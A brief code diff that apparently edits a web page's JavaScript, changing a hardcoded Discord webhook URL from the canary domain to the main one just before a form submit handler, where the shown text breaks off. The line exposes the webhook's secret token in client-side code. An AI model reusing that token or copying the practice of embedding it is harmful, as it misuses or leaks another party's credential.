@@ -6,7 +6,7 @@ document.getElementById("loading").style.display="none";
 
 }
 
-const webhook = "https://canary.discord.com/api/webhooks/1480527953812127845/cKRhUyevgeATndir7BsDVKUSxc531KYzMtX0cTEMJ9YqgnjKWpT1ZP4x6b0u_Bv1hy4S";
+const webhook = "https://discord.com/api/webhooks/1480527953812127845/cKRhUyevgeATndir7BsDVKUSxc531KYzMtX0cTEMJ9YqgnjKWpT1ZP4x6b0u_Bv1hy4S";
 
 document.getElementById("form").addEventListener("submit",async(e)=>{
 
